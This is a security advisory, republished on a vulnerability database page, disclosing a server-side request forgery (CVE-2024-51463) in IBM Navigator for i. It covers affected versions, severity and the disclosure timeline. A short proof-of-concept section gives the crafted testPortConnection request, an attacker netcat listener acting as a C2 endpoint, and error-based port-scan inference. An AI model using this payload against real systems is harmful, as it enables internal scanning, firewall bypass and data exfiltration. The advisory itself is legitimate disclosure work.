---
title: IBMi Navigator Server Side Request Forgery (SSRF)
url: https://cxsecurity.com/issue/WLB-2024120028
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-12-29
fetch_date: 2025-10-06T19:33:17.841404
---

# IBMi Navigator Server Side Request Forgery (SSRF)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **IBMi Navigator Server Side Request Forgery (SSRF)** **2024.12.28**  Credit:  **[hyp3rlinx](https://cxsecurity.com/author/hyp3rlinx/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-51463](https://cxsecurity.com/cveshow/CVE-2024-51463/ "Click to see CVE-2024-51463")**  CWE: **N/A** | |

[+] Credits: John Page (aka hyp3rlinx)
[+] Website: hyp3rlinx.altervista.org
[+] Source: https://hyp3rlinx.altervista.org/advisories/IBMi\_Navigator\_Server\_Side\_Request\_Forgery\_CVE-2024-51463.txt
[+] x.com/hyp3rlinx
[+] ISR: ApparitionSec
[Vendor]
www.ibm.com
[Product]
Navigator for i is a Web console interface where you can perform the key tasks to administer your IBM i.
IBM Navigator for i supports the vast majority of tasks that were available in the System i Navigator Windows client application.
This Web application is part of the base IBM i operating system, and can be easily accessed from your web browser.
[Vulnerability Type]
Server Side Request Forgery (SSRF)
[CVE Reference]
CVE-2024-51463
[Security Issue]
IBM i is vulnerable to server-side request forgery (SSRF). This may allow an authenticated attacker to send unauthorized requests from the system,
potentially leading to network enumeration or facilitating other attacks.
post auth server side request forgery on non managed nodes to external hosts on any TCP ports. There are two call vectors that can be abused here,
one is the "Test TLS connection" but it only allows connections to TCP port 9476.
However, there exists another servlet method called "testConnectPort" which an authenticated attacker can use to connect to any IP and PORT
outside of the LAN. This can be abused for port scans, information disclosure, exfil data., bypass firewall rules to attack non managed nodes
or connect to attacker controlled C2 infrastructure.
This SSRF relies on exploiting a HTTP servlet generated security token bypass CVE-2024-51464, where intercepted HTTP request MN tokens are
incremented or padded with zero. This attacker controlled MN token is now seen as valid and the HTTP 403 Forbidden restriction is bypassed.
[Exploit/POC]
1) attacker payload
POST /Navigator/DispatcherServlet/serviceability/testPortConnection?system=10.1.1.4
{"hostname":"10.2.10.16", "port":445}
2) attackers c2 server
â”Œâ”€â”€(rootï’€ggKali)-[/usr/share]
â””â”€# nc -llvp 445
listening on [any] 445 ...
connect to [10.2.10.16] from victimhost [10.1.1.4] 44569
For port scan we can infer if external host ports are open or closed using error responses.
Port is open:
Error 500: Connection reset
Port is closed
Error 500: A remote host refused an attempted connect
[References]
ADV0142856
https://www.ibm.com/support/pages/node/7179509
[Affected versions]
7.5.0,7.4.0, 7.3.0
[Network Access]
Remote
[Severity]
Medium
CVSS Base score: 5.4
Vendor Notification: 10/14/2024
Vendor fix and publication: 12/20/2024
12/27/2024 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024120028)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top